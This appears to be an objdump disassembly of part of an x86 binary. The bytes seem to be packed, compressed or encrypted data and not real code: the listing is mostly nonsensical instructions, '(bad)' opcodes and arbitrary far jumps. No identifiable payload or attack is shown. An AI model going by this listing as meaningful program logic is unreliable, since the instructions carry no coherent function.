  415cab:	xchg   edx,eax
  415cac:	and    esp,DWORD PTR [esp+ecx*4]
  415caf:	jmp    DWORD PTR [esi]
  415cb1:	and    dh,ah
  415cb3:	inc    eax
  415cb4:	dec    esp
  415cb5:	fisub  WORD PTR ds:0x2158a224
  415cbb:	jns    0x415c75
  415cbd:	loope  0x415cb5
  415cbf:	mov    dh,0x36
	...
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0x99d2:0xeb33e72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    BYTE PTR [edi+0x1a30d2f8],bl
  415d51:	loop   0x415cdb
  415d53:	daa    
  415d54:	popf   
  415d55:	xor    BYTE PTR [ebp-0x62607d0e],al
  415d5b:	hlt    
  415d5c:	mov    esp,?
  415d5e:	pop    ecx
  415d5f:	ret    0x5569
  415d62:	xor    DWORD PTR [ecx-0x64],eax
  415d65:	int3   
  415d66:	sub    bh,BYTE PTR [edx]
  415d68:	enter  0x80ad,0x35
  415d6c:	pop    edx
  415d6d:	ins    BYTE PTR es:[edi],dx
  415d6e:	sub    DWORD PTR [eax],edx
  415d70:	jmp    0x415dd6
  415d72:	xor    bh,ch
  415d74:	xchg   esi,eax
  415d75:	les    esi,FWORD PTR [ecx+0x2]
  415d78:	jne    0x415d0b
  415d7a:	in     al,dx
  415d7b:	(bad)  [ebx+0x41c9d880]
  415d81:	psrlw  mm7,mm7
  415d84:	pop    edi
  415d85:	inc    ebx
  415d86:	sbb    DWORD PTR [eax+0x62464309],ebp
  415d8c:	retf   
  415d8d:	cdq    
  415d8e:	not    BYTE PTR [edx+0x382463d7]
  415d94:	xchg   ecx,eax
  415d95:	pop    esi
  415d96:	pushf  
  415d97:	cmp    al,0x92
  415d99:	and    al,0x86
  415d9b:	cmp    BYTE PTR [ebx-0x3a],dh
  415d9e:	and    bh,BYTE PTR [edi+edi*1+0x6d1dec43]
  415da5:	push   ebx
  415da6:	xchg   edi,eax
  415da7:	push   esp
  415da8:	mov    ah,0x3c
  415daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dab:	(bad)  
  415dad:	xchg   edi,eax
  415dae:	xor    BYTE PTR [esi+0x36994864],0x6f
  415db5:	xor    dl,BYTE PTR [edx]
  415db7:	outs   dx,BYTE PTR ds:[esi]
  415db8:	mov    eax,ds:0xcb89676a
  415dbd:	test   DWORD PTR [ecx],ebp
  415dbf:	inc    esp
  415dc0:	popf   
  415dc1:	pusha  
  415dc2:	inc    ecx
  415dc3:	mov    ecx,0x22131efc
  415dc8:	pop    ss
  415dc9:	shl    BYTE PTR [ecx+0x374641f4],1
  415dcf:	jno    0x415df2
  415dd1:	das    
  415dd2:	test   cl,ah
  415dd4:	mov    es:0xdae2ec14,al
  415dda:	mov    eax,ds:0xc4f29c44
  415ddf:	and    eax,DWORD PTR [edi-0x20]
  415de2:	push   ecx
  415de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415de4:	pop    es
  415de5:	(bad)  
  415de6:	xor    eax,0x1ad26819
  415deb:	pop    edi
  415dec:	mov    ds:0xd482619c,eax
  415df1:	in     eax,dx
  415df2:	jp     0x415e65
  415df4:	loope  0x415e4d
  415df6:	inc    ebx
  415df7:	or     BYTE PTR [ecx+0x33],ah
  415dfa:	jecxz  0x415dce
  415dfc:	mov    al,BYTE PTR ds:0x40c8a8d7
  415e02:	sbb    ch,BYTE PTR [edi+edi*1]
  415e05:	add    bl,BYTE PTR [ebx+0x3a7dc640]
  415e0b:	(bad)
  415e10:	adc    cl,al
  415e12:	push   0xffffffb1
  415e14:	cmp    edx,eax
  415e16:	rol    BYTE PTR [ecx+edx*4],cl
  415e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e1a:	lahf   
  415e1b:	ja     0x415e13
  415e1d:	push   0xffffffde
  415e1f:	sbb    DWORD PTR [edi-0xfa1f9a0],edx
  415e25:	enter  0xab0f,0xd
  415e29:	in     eax,dx
  415e2a:	xchg   esp,esi
  415e2c:	xbegin 0xa0aacb76
  415e32:	push   es
  415e33:	adc    al,0x7c
  415e35:	aaa    
  415e36:	sbb    edi,0x10711a4f
  415e3c:	or     al,0xd5
  415e3e:	or     DWORD PTR [edi],ebx
  415e40:	lds    eax,FWORD PTR [eax]
	...
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs popa 
  415ec1:	inc    eax
  415ec2:	push   ebx
  415ec3:	mov    ss,WORD PTR [ebx]
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	cmc    
  415ec9:	add    BYTE PTR [eax],al
  415ecb:	add    BYTE PTR [edx+0x4a],bl
  415ece:	add    bh,0x9b
  415ed1:	sub    al,0x8
  415ed3:	and    al,bh
  415ed5:	fistp  QWORD PTR [ebx]
  415ed7:	dec    eax
  415ed8:	inc    eax
  415ed9:	hlt    
  415eda:	add    ebp,DWORD PTR [ecx+0x530fa070]
  415ee0:	pop    esp
  415ee1:	or     DWORD PTR [ecx-0x37074045],edx
  415ee7:	adc    al,0x24
  415ee9:	pusha  
  415eea:	and    esi,esp
  415eec:	mov    ecx,0xd940f60c
  415ef1:	(bad)  
  415ef2:	out    0x6e,eax
  415ef4:	cwde   
  415ef5:	push   edx
  415ef6:	int    0x33
  415ef8:	sahf   
  415ef9:	xchg   sp,ax
  415efb:	fidivr DWORD PTR ds:0xa99e8e3b
  415f01:	rcr    edi,cl
  415f03:	add    al,0xd1
  415f05:	and    eax,0x21ecfbff
  415f0a:	jno    0x415ef3
  415f0c:	mov    bl,0xb2
  415f0e:	repnz add al,0xf6
  415f11:	push   ebx
  415f12:	mov    ebp,DWORD PTR [ecx]
  415f14:	xlat   BYTE PTR ds:[ebx]
  415f15:	mov    esi,0x56b9382d
  415f1a:	cli    
  415f1b:	sbb    al,0x1d
  415f1d:	pop    edi
  415f1e:	dec    ecx
  415f1f:	clts   
  415f21:	stc    
  415f22:	ror    DWORD PTR [ebx+0x38f96df9],1
  415f28:	push   esi
  415f29:	or     BYTE PTR [edi-0x67],0x73
  415f2d:	mov    edi,0x2588f1b1
  415f32:	add    BYTE PTR [ecx],ch
  415f34:	(bad)  
  415f35:	sbb    eax,0xc340d175
  415f3a:	out    0x1b,eax
  415f3c:	sbb    al,0x94
  415f3e:	mov    DWORD PTR [ebx-0x78eea816],edi
  415f44:	jne    0x415f89
  415f46:	repz add eax,0x6aca34cd
  415f4c:	add    BYTE PTR [ecx+eiz*1],ch
  415f4f:	sub    DWORD PTR [esi],edi
  415f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f52:	cmp    eax,0xd5ca0b9f
  415f57:	adc    eax,0xfe459203
  415f5c:	loope  0x415f86
  415f5e:	adc    BYTE PTR [esi+0x148e1568],dl
  415f64:	mov    ah,0x50
  415f66:	push   0xbd0f69c8
  415f6b:	dec    edx
  415f6c:	xchg   edi,eax
  415f6d:	adc    bh,BYTE PTR [esi+0x4b]
  415f70:	dec    esp
  415f71:	mov    ds:0x2048b077,eax
  415f76:	push   ecx
  415f77:	or     eax,0xa058368e
  415f7c:	mov    ah,0x11
  415f7e:	fild   QWORD PTR [eax-0xdcc3777]
  415f84:	(bad)  
  415f85:	imul   edx,DWORD PTR [ecx],0x5ea85653
  415f8b:	sbb    bl,BYTE PTR [ecx+ebx*2+0x394cf74a]
  415f92:	mov    ecx,0xa19b95e3
  415f97:	popf   
  415f98:	inc    eax
  415f99:	mov    dl,BYTE PTR [ebx]
  415f9b:	adc    edx,eax
  415f9d:	sbb    eax,0xff9c6e8c
  415fa2:	cmp    al,0xf0
  415fa4:	ss test dh,al
  415fa7:	(bad)  
  415fa8:	jl     0x416023
  415faa:	jno    0x415f31
  415fac:	cmp    BYTE PTR [eax+0x57347ac2],0xbc
  415fb3:	aas    
  415fb4:	jge    0x415fdf
  415fb6:	aaa    
  415fb7:	in     ax,dx
  415fb9:	inc    ebx
  415fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fbb:	inc    ecx
  415fbc:	js     0x415f44
  415fbe:	sbb    BYTE PTR [esi+0xac],ah
	...
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   ebp,DWORD PTR [edi-0x54],0x55
  416043:	xchg   DWORD PTR [eax],ecx
  416045:	icebp  
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    BYTE PTR [ebx+eiz*4-0x61],ah
  41604f:	fs push 0x5fb6b3dd
  416055:	rcr    BYTE PTR [ebx],1
  416057:	pop    ss
  416058:	in     eax,dx
  416059:	xor    eax,0x1f8a308b
  41605e:	push   edi
  41605f:	cli    
  416060:	out    0xda,al
  416062:	cmp    bh,0x1b
  416065:	in     eax,0xbb
  416067:	int    0x73
  416069:	retf   
  41606a:	pop    edi
  41606b:	stc    
  41606c:	pop    ds
  41606d:	push   es
  41606e:	mov    ds:0x35a25772,al
  416073:	outs   dx,DWORD PTR ds:[esi]
  416074:	and    al,BYTE PTR [esi+ecx*8+0x1ef33336]
  41607b:	push   eax
  41607c:	sbb    eax,0x8bf33b9f
  416081:	jmp    0x7b390a67
  416086:	cmp    edi,edx
  416088:	aam    0xbe
  41608a:	sbb    ebp,edx
  41608c:	sti    
  41608d:	test   al,0x75
  41608f:	add    DWORD PTR [edi],0xffffffa4
  416092:	inc    esp
  416093:	jle    0x4160c7
  416095:	push   eax
  416096:	bound  edi,QWORD PTR [edi+0x4b82ae28]
  41609c:	jae    0x416099
  41609e:	jno    0x416020
  4160a0:	pop    ebx
  4160a1:	pop    edx
  4160a2:	clc    
  4160a3:	cli    
  4160a4:	loopne 0x416065
  4160a6:	xchg   DWORD PTR [esi],esi
  4160a8:	shr    DWORD PTR [eax+0x54],cl
  4160ab:	sti    
  4160ac:	inc    edi
  4160ad:	pop    edx
  4160ae:	ror    BYTE PTR [esi],cl
  4160b0:	adc    esi,DWORD PTR [ebp-0x248b9ac]
  4160b6:	mov    edi,0x4ff5fc1b
  4160bb:	sub    ebx,DWORD PTR [ecx]
  4160bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160be:	shl    BYTE PTR [esi],0x63
  4160c1:	in     al,dx
  4160c2:	sahf   
  4160c3:	ror    BYTE PTR [ebp+0x24],0x9
  4160c7:	(bad)
  4160ca:	gs or  eax,0x920dcfd7
  4160d0:	loop   0x4160b2
  4160d2:	mov    ecx,0xf6c38585
  4160d7:	dec    eax
  4160d8:	cwde   
  4160d9:	shr    DWORD PTR [ebp+eiz*4-0x3c233100],1
  4160e0:	lods   eax,DWORD PTR ds:[esi]
  4160e1:	push   0x79
  4160e3:	jp     0x41609a
  4160e5:	mov    ch,0xc9
  4160e7:	mov    bl,0xb7
  4160e9:	cmp    BYTE PTR [ebx+0xdc955f9],ch
  4160ef:	mov    eax,ds:0x29e6d187
  4160f4:	and    al,0xe3
  4160f6:	mov    dl,0x25
  4160f8:	pop    ds
  4160f9:	mov    ?,WORD PTR [esi+0x693b2fe6]
  4160ff:	or     BYTE PTR [ebx-0x40ea0b7c],0x4a
  416106:	lahf   
  416107:	fucomi st,st(2)
  416109:	not    BYTE PTR [ebx-0x75]
  41610c:	dec    edi
  41610d:	xor    esp,DWORD PTR [edx+0x2e2ddf8a]
  416113:	mov    bh,dh
  416115:	aad    0x18
  416117:	xor    BYTE PTR [ebx],0xaa
  41611a:	test   eax,0xbb82f1e3
  41611f:	cmp    BYTE PTR [edi+0x5a],bl
  416122:	xchg   edx,eax
  416123:	pop    esp
  416124:	(bad)  
  416125:	ds call 0x370a:0x88f7a36
  41612d:	mov    ah,0x35
  41612f:	push   ds
  416130:	int3   
  416131:	outs   dx,DWORD PTR ds:[esi]
  416132:	mov    ds:0x35077754,eax
  416137:	mov    esp,0xedda2cb8
  41613c:	sbb    cl,BYTE PTR [ecx+0x7bb75]
	...
  4161b2:	add    BYTE PTR [eax],al
  4161b4:	sub    al,0x97
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    ecx,DWORD PTR [ecx]
  4161c1:	add    ch,BYTE PTR [eax-0x3a]
  4161c4:	std    
  4161c5:	icebp  
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	cmc    
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    BYTE PTR [eax+0x43],dh
  4161ce:	repz mov bl,0x89
  4161d1:	adc    eax,0x3d4b64b2
  4161d6:	cmovge esi,edi
  4161d9:	ja     0x4161e1
  4161db:	ret    0xd6c6
  4161de:	fs mov bl,0x3
  4161e1:	mov    ebp,0x2b6d18c5
  4161e6:	repz test DWORD PTR [ecx],esi
  4161e9:	adc    BYTE PTR [ebp-0x72a70fa0],0xb8
  4161f0:	add    al,0xf0
  4161f2:	push   edi
  4161f3:	adc    DWORD PTR [esi+0x2a2a9917],ebp
  4161f9:	icebp  
  4161fa:	addr16 push esi
  4161fc:	or     BYTE PTR [eax-0x488589e2],ch
  416202:	jbe    0x4161cb
  416204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416206:	sub    eax,0x71afa854
  41620b:	stc    
  41620c:	inc    ecx
  41620d:	cmp    al,0x41
  41620f:	je     0x41622d
  416211:	push   ecx
  416212:	sub    bl,BYTE PTR [edi+0x640fbaa9]
  416218:	sub    BYTE PTR [ebp-0x55],bh
  41621b:	iret   
  41621c:	mov    al,ds:0xd9c7df23
  416221:	cmp    eax,0xd49a32a9
  416226:	ret    
  416227:	jae    0x41621c
  416229:	push   ebx
  41622a:	arpl   sp,dx
  41622c:	enter  0xece9,0xb6
  416230:	hlt    
  416231:	sbb    dh,bl
  416233:	mov    ebx,0x661631c
  416238:	stc    
  416239:	std    
  41623a:	adc    BYTE PTR [esi-0x1b01e489],cl
  416240:	pop    edx
  416241:	push   ds
  416242:	sub    ebp,DWORD PTR [ebx]
  416244:	das    
  416245:	mov    eax,0x87204c9b
  41624a:	leave  
  41624b:	adc    eax,ebx
  41624d:	adc    ecx,DWORD PTR [eax]
  41624f:	sub    dh,dl
  416251:	or     BYTE PTR [ebx-0x9],al
  416254:	fist   DWORD PTR [ecx+0x468091f5]
  41625a:	idiv   ebp
  41625c:	(bad)  
  41625d:	xchg   esp,eax
  41625e:	es mov eax,0x3e2f07bb
  416264:	jno    0x416248
  416266:	call   0x49c5b121
  41626b:	sub    edx,DWORD PTR [ebx+0x4c33b3a1]
  416271:	mov    al,ds:0xf7bdb2f2
  416276:	or     eax,0x99de44e5
  41627b:	pusha  
  41627c:	aaa    
  41627d:	test   DWORD PTR [ecx+ebp*1+0x19],0x8a3ad4be
  416285:	mov    cl,0xc6
  416287:	jnp    0x4162cd
  416289:	loop   0x4162ad
  41628b:	jae    0x41621c
  41628d:	and    al,bl
  41628f:	xor    esp,edi
  416291:	jp     0x4162a0
  416293:	jge    0x4162fa
  416295:	push   ss
  416296:	cmp    ch,BYTE PTR [edi]
  416298:	mov    BYTE PTR [eax+0x38],dh
  41629b:	fmul   st,st(2)
  41629d:	jmp    DWORD PTR [ebp-0x35]
  4162a0:	test   ch,cl
  4162a2:	daa    
  4162a3:	ss (bad) 
  4162a5:	fwait
  4162a6:	outs   dx,DWORD PTR ds:[esi]
  4162a7:	sbb    ah,ah
  4162a9:	ret    0x457a
  4162ac:	mov    ebx,0x7187f34b
  4162b1:	repz xchg ecx,eax
  4162b3:	fdiv   QWORD PTR [ebp+0x64b82dfd]
  4162b9:	adc    BYTE PTR [edx+0x29],bl
  4162bc:	jmp    0x4162fd
  4162be:	jmp    0x0:0xece4
	...
  416331:	add    BYTE PTR [eax],al
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	(bad)  
  416341:	pop    esp
  416342:	jo     0x4163bb
  416344:	repnz repnz add BYTE PTR [eax],al
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    dh,cl
  41634d:	cs and al,0x45
  416350:	cmp    ebx,edi
  416352:	and    DWORD PTR [esi-0x4d],ebp
  416355:	clc    
  416356:	jno    0x41637e
  416358:	dec    edi
  416359:	add    al,0x60
  41635b:	push   ebx
  41635c:	dec    ebp
  41635d:	jl     0x41631d
  41635f:	xchg   esi,eax
  416360:	xor    al,0x26
  416362:	push   ds
  416363:	popf   
  416364:	dec    ecx
  416365:	cdq    
  416366:	mov    esi,0x9820f42c
  41636b:	jo     0x4162f8
  41636d:	mov    edx,0xe1bd632c
  416372:	mov    ebp,0x3a7f7ee6
  416377:	sub    BYTE PTR [ebx+0x3e],bl
  41637a:	icebp  
  41637b:	inc    esp
  41637c:	add    al,0xa8
  41637e:	cld    
  41637f:	or     al,0x98
  416381:	fnsave [ebp-0x710c214d]
  416387:	cmp    esi,ecx
  416389:	stos   BYTE PTR es:[edi],al
  41638a:	out    0xb9,al
  41638c:	mov    DWORD PTR [eax+0x780ca8ea],edi
  416392:	push   eax
  416393:	in     al,0x54
  416395:	jo     0x416365
  416397:	cld    
  416398:	mov    al,ds:0xe175c118
  41639d:	mov    al,ds:0x8fd41c66
  4163a2:	cs (bad) 
  4163a5:	xchg   BYTE PTR [edi],ah
  4163a7:	inc    ecx
  4163a8:	fst    DWORD PTR ds:0x522269ea
  4163ae:	fnstcw WORD PTR [ecx]
  4163b0:	test   al,0x69
  4163b2:	mov    WORD PTR [esi],fs
  4163b4:	mov    ecx,edx
  4163b6:	icebp  
  4163b7:	lds    esp,FWORD PTR [edx+0x7]
  4163ba:	test   BYTE PTR [esi+0x77],0x54
  4163be:	popf   
  4163bf:	(bad)  
  4163c1:	sbb    ch,dh
  4163c3:	mov    cl,0x5d
  4163c5:	mov    eax,0x2fefbebf
  4163ca:	test   eax,0xaf78f211
  4163cf:	popa   
  4163d0:	punpcklwd mm7,mm0
  4163d3:	fwait
  4163d4:	jecxz  0x4163c6
  4163d6:	shl    BYTE PTR [bx+di],0xd7
  4163da:	xor    ch,dh
  4163dc:	pop    ecx
  4163dd:	push   ebx
  4163de:	outs   dx,DWORD PTR ds:[esi]
  4163df:	cdq    
  4163e0:	push   0xcbbfb961
  4163e5:	push   es
  4163e6:	jmp    0x4163a9
  4163e8:	xchg   edi,eax
  4163e9:	(bad)  
  4163eb:	mov    ebp,0x6bee7347
  4163f0:	pop    ds
  4163f1:	fld    TBYTE PTR [esp+eax*1+0x1d3488e6]
  4163f8:	sti    
  4163f9:	fld    DWORD PTR [eax]
  4163fb:	mov    bl,0x69
  4163fd:	neg    DWORD PTR [ebx]
  4163ff:	xchg   edx,eax
  416400:	test   al,0xfa
  416402:	adc    ch,BYTE PTR [edx-0x48]
  416405:	or     al,bh
  416407:	outs   dx,BYTE PTR ds:[esi]
  416408:	div    al
  41640a:	cld    
  41640b:	cwde   
  41640c:	pop    esp
  41640d:	or     bl,BYTE PTR [edi]
  41640f:	pop    edi
  416410:	dec    edi
  416411:	sahf   
  416412:	push   0xb89ebb31
  416417:	fcom   QWORD PTR [esp+eax*4+0x485c4244]
  41641e:	imul   ebp,DWORD PTR [ebx],0x655c7083
  416424:	popa   
  416425:	push   es
  416426:	jno    0x41647b
  416428:	or     DWORD PTR [edi+0x3f],ebx
  41642b:	add    eax,0xbe28ad59
  416430:	sar    DWORD PTR [ecx-0x7b],cl
  416433:	mov    ebp,0xc84d6d8d
  416438:	sahf   
  416439:	dec    esp
  41643a:	add    eax,0x2f4f7d64
  41643f:	enter  0x21,0x0
	...
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	jp     0x416514
  4164c2:	xchg   ebp,eax
  4164c3:	sti    
  4164c4:	out    0xf3,eax
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    cl,bl
  4164cd:	inc    ecx
  4164ce:	jnp    0x416507
  4164d0:	test   eax,0x3c2c74c
  4164d5:	dec    ebp
  4164d6:	hlt    
  4164d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164d8:	imul   ebx,DWORD PTR [esi+0x2b],0x9e361a39
  4164df:	xchg   edi,eax
  4164e0:	push   ds
  4164e1:	adc    BYTE PTR [edx+0x1eb33695],0x60
  4164e8:	rcr    esp,1
  4164ea:	or     cl,ch
  4164ec:	add    DWORD PTR [ecx+eax*8+0x459e835a],edi
  4164f3:	sbb    eax,0xa79d2e43
  4164f8:	push   esi
  4164f9:	push   esi
  4164fa:	add    edx,esi
  4164fc:	cli    
  4164fd:	mov    ds:0x42b2e10f,eax
  416502:	stos   BYTE PTR es:[edi],al
  416503:	(bad)  
  416504:	gs test al,ch
  416507:	shr    BYTE PTR [ebx+0x72],cl
  41650a:	popf   
  41650b:	scas   eax,DWORD PTR es:[edi]
  41650c:	mov    bl,0x55
  41650e:	mov    ch,0x21
  416510:	inc    ecx
  416511:	repnz mov al,ds:0xb0705f6f
  416517:	cmp    edx,0xa8444ad9
  41651d:	cmp    dh,BYTE PTR [ebx+0x16d63aa9]
  416523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416524:	sbb    al,0xea
  416526:	jmp    0x41650d
  416528:	mov    ebx,0x8de7e2dc
  41652d:	nop
  41652e:	aam    0xd4
  416530:	je     0x416582
  416532:	test   BYTE PTR [ecx+0x1],cl
  416535:	mov    BYTE PTR [ebx+0x2d],0x44
  416539:	je     0x4164ea
  41653b:	fcom   DWORD PTR [edi]
  41653d:	pop    ebx
  41653e:	nop
  41653f:	ror    BYTE PTR [edx],0x33
  416542:	ja     0x416570
  416544:	jnp    0x4164d5
  416546:	jae    0x416592
  416548:	sbb    al,0x9d
  41654a:	jb     0x416573
  41654c:	mov    ds:0xa5359ff7,al
  416551:	xor    ecx,ebx
  416553:	fsub   DWORD PTR [ebp+0x27551d73]
  416559:	js     0x416549
  41655b:	aam    0x2
  41655d:	aad    0xc1
  41655f:	and    ebp,DWORD PTR [eax-0x13]
  416562:	aad    0xe4
  416564:	(bad)  
  416565:	adc    BYTE PTR [edx+edx*4+0x2d],dh
  416569:	sbb    DWORD PTR [ecx-0x14],ebx
  41656c:	sar    dh,cl
  41656e:	mov    WORD PTR [ebp-0x6b],?
  416571:	jg     0x4164fd
  416573:	(bad)  
  416574:	pop    ss
  416575:	pop    eax
  416576:	xor    al,0x7b
  416578:	dec    eax
  416579:	sbb    BYTE PTR [ebx+0x4134e813],cl
  41657f:	dec    esi
  416580:	mov    gs,edi
  416582:	cli    
  416583:	mov    dh,0x70
  416585:	rol    DWORD PTR ds:0x9642dc01,0x50
  41658c:	adc    al,BYTE PTR [ecx-0x48]
  41658f:	push   0xf40f663d
  416594:	jb     0x4165f5
  416596:	lea    esp,[edi+0x7c]
  416599:	es sbb eax,0x12849b14
  41659f:	sbb    DWORD PTR [eax],ecx
  4165a1:	sub    bh,cl
  4165a3:	fstp   QWORD PTR [edi+ecx*4]
  4165a6:	hlt    
  4165a7:	xchg   edx,eax
  4165a8:	pop    edx
  4165a9:	push   cs
  4165aa:	retf   0xad55
  4165ad:	shl    DWORD PTR [ebx+edx*8+0x58],cl
  4165b1:	jae    0x41656f
  4165b3:	adc    DWORD PTR [eax],eax
  4165b5:	int    0xcd
  4165b7:	dec    edx
  4165b8:	in     al,0xb4
  4165ba:	cwde   
  4165bb:	sahf   
  4165bc:	add    esp,DWORD PTR [edi+0xb44866]
	...
  416632:	add    BYTE PTR [eax],al
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	call   0xbafd:0x67ff45bc
  41663c:	retf   
  41663d:	sbb    ah,dh
  41663f:	aad    0xcb
  416641:	les    ecx,FWORD PTR [ecx+0x5]
  416644:	fdivr  st(4),st
  416646:	add    BYTE PTR [eax],al
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [edi],ah
  41664d:	in     al,dx
  41664e:	retf   0x92a8
  416651:	inc    esp
  416652:	push   es
  416653:	lods   eax,DWORD PTR ss:[esi]
  416655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416656:	jp     0x416684
  416658:	out    0x7d,eax
  41665a:	xchg   DWORD PTR [ecx+0x52],ebp
  41665d:	retf   0xe369
  416660:	fs or  eax,0x84904196
  416666:	cmp    BYTE PTR [ecx-0x66db9ee6],0xa8
  41666d:	inc    ebx
  41666e:	inc    esi
  41666f:	xor    DWORD PTR [ecx-0x7c],0xdafea068
  416676:	test   DWORD PTR [esp+eiz*4+0x4b],0x97e44074
  41667e:	sbb    BYTE PTR [ebx+0x16],cl
  416681:	nop
  416682:	push   edi
  416683:	stc    
  416684:	js     0x416610
  416686:	mov    DWORD PTR [ecx],edx
  416688:	loopne 0x416662
  41668a:	adc    dh,BYTE PTR [edx+edi*2-0x3d]
  41668e:	dec    ebx
  41668f:	pop    edi
  416690:	inc    ecx
  416691:	and    ebp,DWORD PTR [ebx-0x51]
  416694:	loope  0x416638
  416696:	ret    0x1f67
  416699:	and    ecx,ebp
  41669b:	inc    esi
  41669c:	mov    esi,0x2c0a5659
  4166a1:	dec    esi
  4166a2:	les    ebx,FWORD PTR [edx]
  4166a4:	aam    0x17
  4166a6:	xchg   esp,eax
  4166a7:	add    al,0xd5
  4166a9:	push   esp
  4166aa:	xchg   ecx,eax
  4166ab:	fdiv   st(7),st
  4166ad:	pop    es
  4166ae:	mov    eax,ds:0x4b8381f1
  4166b3:	jg     0x416717
  4166b5:	cmp    dl,bl
  4166b7:	push   ebp
  4166b8:	sub    eax,edi
  4166ba:	xchg   edx,eax
  4166bb:	xor    eax,0x3802917d
  4166c0:	pop    ebx
  4166c1:	jo     0x416734
  4166c3:	sahf   
  4166c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c5:	jne    0x41670c
  4166c7:	pop    esi
  4166c8:	test   eax,0xa78ada7e
  4166cd:	xchg   ebp,eax
  4166ce:	mov    eax,ds:0x13e382b3
  4166d3:	pop    eax
  4166d4:	sbb    eax,0xa3523aa8
  4166d9:	push   ecx
  4166da:	loopne 0x41669e
  4166dc:	out    0xdb,eax
  4166de:	cmp    eax,0x1fa8ac12
  4166e3:	and    ah,bh
  4166e5:	mov    WORD PTR [edx],gs
  4166e7:	bound  edx,QWORD PTR [ecx-0x7e]
  4166ea:	xor    DWORD PTR [esi],ebx
  4166ec:	(bad)  
  4166ee:	jp     0x4166b6
  4166f0:	scas   eax,DWORD PTR es:[edi]
  4166f1:	punpckhwd mm2,QWORD PTR [eax+0x4be4ef43]
  4166f8:	xchg   al,ch
  4166fa:	test   BYTE PTR [edx+ecx*2],ch
  4166fd:	pop    eax
  4166fe:	dec    edi
  4166ff:	push   0x6726e7c
  416704:	xchg   ebp,eax
  416705:	push   ebx
  416706:	jo     0x41668d
  416708:	hlt    
  416709:	mov    edx,0xd232360c
  41670e:	hlt    
  41670f:	ret    0x667e
  416712:	cdq    
  416713:	or     DWORD PTR [edx],edi
  416715:	and    al,0x1
  416717:	pop    es
  416718:	shl    edx,1
  41671a:	pusha  
  41671b:	inc    esi
  41671c:	stos   BYTE PTR es:[edi],al
  41671d:	sbb    eax,0xc87c8f4c
  416722:	jbe    0x416783
  416724:	sbb    al,0x21
  416726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416727:	xor    dl,ch
  416729:	test   BYTE PTR [edx-0x747e107f],0x82
  416730:	sub    DWORD PTR [ecx+0x6c8ab4d3],ebp
  416736:	xor    eax,0xda8689ef
  41673b:	into   
  41673c:	sahf   
  41673d:	push   cs
  41673e:	rcl    BYTE PTR [ebp+0x59],cl
	...
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm1,DWORD PTR [edi]
  4167c1:	adc    BYTE PTR [eax+edi*2-0x2f],0xf5
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	cmc    
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [ebx+0x1a],ah
  4167ce:	fcomp  DWORD PTR [ecx-0x41993cb3]
  4167d4:	imul   eax,DWORD PTR [ebx],0x2b
  4167d7:	lods   eax,DWORD PTR ds:[esi]
  4167d8:	xor    eax,0xfd1ebf88
  4167dd:	xor    al,0x35
  4167df:	aam    0x19
  4167e1:	jecxz  0x41682f
  4167e3:	(bad)  
  4167e5:	push   esp
  4167e6:	mov    al,ds:0xc613f9ea
  4167eb:	gs push 0xdadc5f47
  4167f1:	pop    edi
  4167f2:	movaps XMMWORD PTR [eax+0x26a3618c],xmm1
  4167f9:	pop    edx
  4167fa:	sbb    BYTE PTR [edi-0x69],ch
  4167fd:	out    0x7a,al
  4167ff:	and    cl,dl
  416801:	(bad)
  416805:	hlt    
  416806:	pop    esp
  416807:	mov    edx,0x71af1ea6
  41680c:	pop    ds
  41680d:	cmp    al,0x67
  41680f:	sti    
